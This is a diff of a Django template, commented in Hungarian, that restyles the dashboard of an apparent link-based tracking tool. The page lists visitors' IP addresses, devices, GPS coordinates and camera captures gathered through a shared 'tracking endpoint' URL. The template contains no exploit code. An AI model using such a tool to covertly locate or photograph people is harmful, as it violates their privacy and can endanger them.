@@ -1,59 +1,339 @@
 {% extends 'main/base.html' %}
+{% load static %}
 
 {% block content %}
 {% include 'main/navbar.html' %}
 
-    <span class="badge text-bg-dark my-3">Trackers for  {{case.case_number}}</span>
-    Share this url with : <span class="badge text-bg-info my-3">{{ request.scheme }}://{{request.get_host}}/id/{{case.url_id}}</span>
+<div class="tracker-page">
 
-    <table class="table table-bordered table-hover table-sm align-middle table-dark table-striped" style="position:relative;max-width:100%">
-        <thead class="table-dark">
-            <tr>
-                <th>Időpont</th>
-                <th>IP cím</th>
-                <th>User Agent</th>
-                <th>Captured Images</th>
-            </tr>
-        </thead>
-        <tbody>
-            {% for obj in objs %}
-            <!-- Fő adatok -->
-            <tr>
-                <td style="white-space:nowrap">
-                    <strong>{{ obj.created }}</strong>
-                </td>
-                <td>
-                    <strong>{{ obj.x_forwarded_for }}</strong>
-                </td>
-                <td style="white-space:wrap" colspan="2">
-                    {{ obj.user_agent }}
-                </td>
-            </tr>
-            <!-- Kiegészítő adatok -->
-            <tr class="">
-                <!-- Behúzás -->
-                <td><i class="bi bi-arrow-right-square"></i></td>
-                <td>
-                    Platform:
-                    {{ obj.platform }}
-                </td>
-                <td>
-                    <i class="bi bi-geo-alt mr-2"></i> {{ obj.latitude }}, {{ obj.longitude }} |
-                    <i class="bi bi-cursor mr-2"></i> {{ obj.accuracy }} méter
-                </td>
-                <td>
-                    <a href="{% url 'show_captured_images' obj.pk %}" style="text-decoration: none" class="text-info" >
-                        <i class="bi bi-camera mr-2"></i> {{obj.get_camera_captures.all.count}}
-                    </a>
-                </td>
-            </tr>
-            {% endfor %}
-        </tbody>
-    </table>
+    <!-- Háttér effektek -->
+    <div class="cyber-grid"></div>
+    <div class="glow glow-1"></div>
+    <div class="glow glow-2"></div>
+
+    <div class="tracker-container">
+
+        <!-- HEADER -->
+        <div class="tracker-header">
+
+            <div class="header-left">
+                <div class="icon-box">
+                    <i class="bi bi-radar"></i>
+                </div>
+
+                <div>
+                    <div class="eyebrow">
+                        <span class="status-dot"></span>
+                        LIVE MONITORING
+                    </div>
+
+                    <h1>Tracker Intelligence</h1>
+
+                    <p>
+                        Monitoring and captured intelligence for case
+                        <strong>#{{ case.case_number }}</strong>
+                    </p>
+                </div>
+            </div>
+
+            <div class="case-badge">
+                <span>CASE ID</span>
+                <strong>{{ case.case_number }}</strong>
+            </div>
+
+        </div>
 
 
+        <!-- SHARE URL -->
+        <div class="share-card">
+
+            <div class="share-icon">
+                <i class="bi bi-link-45deg"></i>
+            </div>
+
+            <div class="share-content">
+                <span class="share-label">TRACKING ENDPOINT</span>
+
+                <div class="share-url">
+                    {{ request.scheme }}://{{ request.get_host }}/id/{{ case.url_id }}
+                </div>
+            </div>
+
+            <button class="copy-btn"
+                    onclick="copyTrackerUrl()"
+                    title="Copy URL">
+                <i class="bi bi-copy"></i>
+            </button>
+
+        </div>
 
 
+        <!-- STATS -->
+        <div class="stats-grid">
 
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="bi bi-activity"></i>
+                </div>
+
+                <div>
+                    <span>Total Events</span>
+                    <strong>{{ objs|length }}</strong>
+                </div>
+            </div>
+
+
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="bi bi-camera-video"></i>
+                </div>
+
+                <div>
+                    <span>Captured Sessions</span>
+                    <strong>LIVE</strong>
+                </div>
+            </div>
+
+
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="bi bi-shield-check"></i>
+                </div>
+
+                <div>
+                    <span>System Status</span>
+                    <strong class="online-text">ONLINE</strong>
+                </div>
+            </div>
+
+        </div>
+
+
+        <!-- TABLE CARD -->
+        <div class="table-card">
+
+            <div class="table-header">
+
+                <div>
+                    <span class="section-label">
+                        <i class="bi bi-database"></i>
+                        CAPTURED DATA
+                    </span>
+
+                    <h2>Tracking Events</h2>
+                </div>
+
+                <div class="record-count">
+                    {{ objs|length }} RECORD{{ objs|length|pluralize }}
+                </div>
+
+            </div>
+
+
+            <div class="table-responsive">
+
+                <table class="tracker-table">
+
+                    <thead>
+                        <tr>
+                            <th>
+                                <i class="bi bi-clock"></i>
+                                Timestamp
+                            </th>
+
+                            <th>
+                                <i class="bi bi-globe2"></i>
+                                Network
+                            </th>
+
+                            <th>
+                                <i class="bi bi-pc-display"></i>
+                                Device / Browser
+                            </th>
+
+                            <th>
+                                <i class="bi bi-camera"></i>
+                                Captures
+                            </th>
+                        </tr>
+                    </thead>
+
+
+                    <tbody>
+
+                        {% for obj in objs %}
+
+                        <!-- MAIN ROW -->
+                        <tr class="main-row">
+
+                            <td>
+                                <div class="timestamp">
+                                    <i class="bi bi-clock-history"></i>
+                                    <strong>{{ obj.created }}</strong>
+                                </div>
+                            </td>
+
+
+                            <td>
+
+                                <div class="ip-address">
+                                    <i class="bi bi-router"></i>
+                                    <span>{{ obj.x_forwarded_for }}</span>
+                                </div>
+
+                            </td>
+
+
+                            <td>
+
+                                <div class="user-agent">
+                                    {{ obj.user_agent }}
+                                </div>
+
+                            </td>
+
+
+                            <td>
+
+                                <a href="{% url 'show_captured_images' obj.pk %}"
+                                   class="capture-btn">
+
+                                    <i class="bi bi-camera-fill"></i>
+
+                                    <span>
+                                        {{ obj.get_camera_captures.all.count }}
+                                    </span>
+
+                                </a>
+
+                            </td>
+
+                        </tr>
+
+
+                        <!-- DETAILS ROW -->
+                        <tr class="details-row">
+
+                            <td colspan="4">
+
+                                <div class="details-grid">
+
+                                    <div class="detail-item">
+
+                                        <div class="detail-icon">
+                                            <i class="bi bi-cpu"></i>
+                                        </div>
+
+                                        <div>
+                                            <span>PLATFORM</span>
+                                            <strong>{{ obj.platform }}</strong>
+                                        </div>
+
+                                    </div>
+
+
+                                    <div class="detail-item">
+
+                                        <div class="detail-icon">
+                                            <i class="bi bi-geo-alt"></i>
+                                        </div>
+
+                                        <div>
+                                            <span>LOCATION</span>
+
+                                            <strong>
+                                                {{ obj.latitude }},
+                                                {{ obj.longitude }}
+                                            </strong>
+                                        </div>
+
+                                    </div>
+
+
+                                    <div class="detail-item">
+
+                                        <div class="detail-icon">
+                                            <i class="bi bi-bullseye"></i>
+                                        </div>
+
+                                        <div>
+                                            <span>ACCURACY</span>
+                                            <strong>
+                                                {{ obj.accuracy }} m
+                                            </strong>
+                                        </div>
+
+                                    </div>
+
+
+                                    <a href="{% url 'show_captured_images' obj.pk %}"
+                                       class="view-session">
+
+                                        <i class="bi bi-box-arrow-up-right"></i>
+
+                                        VIEW SESSION
+
+                                    </a>
+
+                                </div>
+
+                            </td>
+
+                        </tr>
+
+                        {% empty %}
+
+                        <tr>
+
+                            <td colspan="4">
+
+                                <div class="empty-state">
+
+                                    <i class="bi bi-radar"></i>
+
+                                    <h3>No tracking activity</h3>
+
+                                    <p>
+                                        Waiting for incoming telemetry...
+                                    </p>
+
+                                </div>
+
+                            </td>
+
+                        </tr>
+
+                        {% endfor %}
+
+                    </tbody>
+
+                </table>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+<script>
+function copyTrackerUrl() {
+
+    const url = "{{ request.scheme }}://{{ request.get_host }}/id/{{ case.url_id }}";
+
+    navigator.clipboard.writeText(url);
+
+    const button = document.querySelector(".copy-btn");
+
+    button.innerHTML = '<i class="bi bi-check-lg"></i>';
+
+    setTimeout(() => {
+        button.innerHTML = '<i class="bi bi-copy"></i>';
+    }, 1500);
+
+}
+</script>
 
 {% endblock content %}
